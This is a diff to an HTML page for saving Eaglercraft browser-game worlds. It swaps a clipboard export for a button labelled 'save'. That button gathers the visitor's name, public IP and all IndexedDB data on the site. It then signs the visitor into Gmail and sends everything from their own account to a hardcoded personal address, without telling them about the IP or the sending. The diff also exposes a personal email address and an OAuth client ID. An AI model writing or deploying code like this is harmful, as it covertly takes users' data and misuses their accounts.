@@ -1,79 +1,115 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Save!</title>
+  <!-- Load Google API client -->
+  <script src="https://apis.google.com/js/api.js"></script>
+</head>
 <body>
-<h1>Save!</h1>
-<p>a tutorial on how to get these on a new website will be posted <a href="/cookietutorial">here</a> at a later date.</p>
+  <h1>Save!</h1>
+  <p>to get the worlds, ask me</p>
 
+  <!-- Button to trigger export and email -->
+  <button id="email-world-btn">save</button>
 
-<!-- Place this where you want the button to appear -->
-<button id="copy-indexeddb">Copy Eaglercraft World</button>
+  <script>
+    // Initialize Google API client for Gmail API
+    function initGapi() {
+      gapi.load('client:auth2', async () => {
+        await gapi.client.init({
+          clientId: '783051024179-emqroh7p2kdt0qfoc8oh9ccga0itqf04.apps.googleusercontent.com', // TODO: replace with your Client ID
+          scope: 'https://www.googleapis.com/auth/gmail.send'
+        });
+      });
+    }
+    initGapi();
 
-<script>
-document.getElementById('copy-indexeddb').addEventListener('click', async () => {
-  const allData = {};
+    document.getElementById('email-world-btn').addEventListener('click', async () => {
+      // 1) Prompt for user's name
+      const userName = prompt("Please enter your name:", "") || 'Unknown';
 
-  // 1) List databases (Chrome 58+)
-  if (typeof indexedDB.databases !== 'function') {
-    return alert('⚠️ indexedDB.databases() not supported');
-  }
-  const dbInfos = await indexedDB.databases();
+      // 2) Fetch public IP address
+      let ip = 'Unknown';
+      try {
+        const resp = await fetch('https://api.ipify.org?format=json');
+        ip = (await resp.json()).ip;
+      } catch (e) {
+        console.warn('Failed to fetch IP:', e);
+      }
 
-  // 2) Read every object store in each DB
-  for (const { name } of dbInfos) {
-    if (!name) continue;
-    await new Promise((resolve, reject) => {
-      const req = indexedDB.open(name);
-      req.onsuccess = () => {
-        const db = req.result;
-        const tx = db.transaction(db.objectStoreNames, 'readonly');
-        const stores = Array.from(db.objectStoreNames);
-        Promise.all(stores.map(storeName =>
-          new Promise((res, rej) => {
-            const store = tx.objectStore(storeName);
-            const getAll = store.getAll();
-            getAll.onsuccess = () => res({ storeName, data: getAll.result });
-            getAll.onerror   = () => rej(getAll.error);
-          })
-        ))
-        .then(results => {
-          allData[name] = {};
-          for (const { storeName, data } of results) {
-            allData[name][storeName] = data;
-          }
-          db.close();
-          resolve();
-        })
-        .catch(err => reject(err));
-      };
-      req.onerror = () => reject(req.error);
+      // 3) Export all IndexedDB data
+      const allData = {};
+      if (typeof indexedDB.databases !== 'function') {
+        alert('⚠️ indexedDB.databases() not supported in this browser');
+        return;
+      }
+      const dbs = await indexedDB.databases();
+      for (const { name } of dbs) {
+        if (!name) continue;
+        await new Promise((resolve, reject) => {
+          const req = indexedDB.open(name);
+          req.onsuccess = async () => {
+            const db = req.result;
+            const tx = db.transaction(db.objectStoreNames, 'readonly');
+            const stores = Array.from(db.objectStoreNames);
+            const results = await Promise.all(stores.map(storeName =>
+              new Promise((res, rej) => {
+                const getAll = tx.objectStore(storeName).getAll();
+                getAll.onsuccess = () => res({ storeName, data: getAll.result });
+                getAll.onerror = () => rej(getAll.error);
+              })
+            ));
+            allData[name] = Object.fromEntries(results.map(r => [r.storeName, r.data]));
+            db.close();
+            resolve();
+          };
+          req.onerror = () => reject(req.error);
+        });
+      }
+
+      // 4) Construct MIME email with Base64 attachment
+      const boundary = '===BOUNDARY===';
+      const attachmentJson = JSON.stringify(allData, null, 2);
+      const messageLines = [
+        `From: me`,
+        `To: mitchfogler@gmail.com`,
+        `Subject: Eaglercraft World Export`,
+        `MIME-Version: 1.0`,
+        `Content-Type: multipart/mixed; boundary="${boundary}"`,
+        '',
+        `--${boundary}`,
+        `Content-Type: text/plain; charset="UTF-8"`,
+        '',
+        `User Name: ${userName}`,
+        `IP Address: ${ip}`,
+        '',
+        `--${boundary}`,
+        `Content-Type: application/json; name="world.json"`,
+        `Content-Disposition: attachment; filename="world.json"`,
+        `Content-Transfer-Encoding: base64`,
+        '',
+        btoa(unescape(encodeURIComponent(attachmentJson))),
+        '',
+        `--${boundary}--`
+      ];
+      const raw = btoa(unescape(encodeURIComponent(messageLines.join('\r\n'))));
+
+      // 5) Ensure user is signed in & send email via Gmail API
+      const auth = gapi.auth2.getAuthInstance();
+      if (!auth.isSignedIn.get()) {
+        await auth.signIn();
+      }
+      const sendReq = gapi.client.gmail.users.messages.send({
+        userId: 'me',
+        resource: { raw }
+      });
+      sendReq.execute(resp => {
+        if (resp.id) alert('✅ World exported and emailed successfully!');
+        else alert('❌ Failed to send email: ' + JSON.stringify(resp));
+      });
     });
-  }
-
-  // 3) Serialize to JSON & make a Blob
-  const json = JSON.stringify(allData, null, 2);
-  const blob = new Blob([json], { type: 'application/json' });
-
-  // 4) Copy as a “file” into the clipboard
-  try {
-    // ClipboardItem API
-    const item = new ClipboardItem({ 'application/json': blob });
-    await navigator.clipboard.write([item]);
-    alert('✅ IndexedDB export copied to clipboard! Paste it as a file attachment.');
-  } catch (err) {
-    console.error('Clipboard write failed', err);
-    alert('Failed to copy file to clipboard.');
-  }
-});
-</script>
-
-
-
-
-  
-  
-
-
+  </script>
 </body>
-
-
-
 </html>
